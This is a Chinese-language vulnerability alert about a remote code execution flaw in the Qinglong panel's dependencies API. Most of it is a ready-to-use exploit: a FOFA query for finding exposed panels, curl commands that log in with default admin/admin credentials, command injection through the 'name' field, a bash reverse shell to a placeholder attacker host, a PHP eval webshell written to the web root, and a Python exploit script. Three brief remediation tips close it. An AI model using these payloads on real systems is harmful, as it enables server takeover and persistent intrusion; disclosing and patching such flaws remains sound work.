---
title: 【漏洞预警】青龙面板 dependencies 接口 RCE漏洞
---

## 漏洞概述
青龙面板dependencies接口存在远程代码执行漏洞，攻击者可通过构造恶意请求在服务器上执行任意命令，控制服务器。

## 漏洞信息
| 属性 | 值 |
|------|-----|
| 漏洞名称 | 青龙面板dependencies接口远程代码执行漏洞 |
| 漏洞类型 | RCE（远程代码执行） |
| 影响组件 | /api/dependencies/look |
| 严重程度 | 严重 |

## FOFA查询
```
icon_hash=="-254502902"
```

## POC
```bash
# 1. 登录获取token（默认账号admin/admin）
curl -X POST "http://target:5700/api/user/login" \
  -H "Content-Type: application/json" \
  -d '{"username":"admin","password":"admin"}'

# 2. 执行命令（需要登录后的cookie）
curl -X POST "http://target:5700/api/dependencies/look" \
  -H "Content-Type: application/json" \
  -H "Cookie: token=你的token" \
  -d '{"name":"test;whoami","id":"123"}'

# 3. 执行反弹shell
curl -X POST "http://target:5700/api/dependencies/look" \
  -H "Content-Type: application/json" \
  -H "Cookie: token=你的token" \
  -d '{"name":"test;bash -i >& /dev/tcp/attacker/port 0>&1","id":"123"}'

# 写入webshell
curl -X POST "http://target:5700/api/dependencies/look" \
  -H "Content-Type: application/json" \
  -H "Cookie: token=你的token" \
  -d '{"name":"test;echo \"<?php eval(\$_POST[1]);?>\" > /var/www/html/shell.php","id":"123"}'
```

Python脚本:
```python
import requests

# 登录
login_url = "http://target:5700/api/user/login"
data = {"username": "admin", "password": "admin"}
r = requests.post(login_url, json=data)
token = r.json().get("data", {}).get("token")

# 执行命令
exec_url = "http://target:5700/api/dependencies/look"
headers = {"Cookie": f"token={token}"}
payload = {"name": f"test;whoami", "id": "123"}
r = requests.post(exec_url, json=payload, headers=headers)
print(r.text)
```

## 修复建议
1. 升级到最新版本
2. 修改默认密码
3. 加强接口访问控制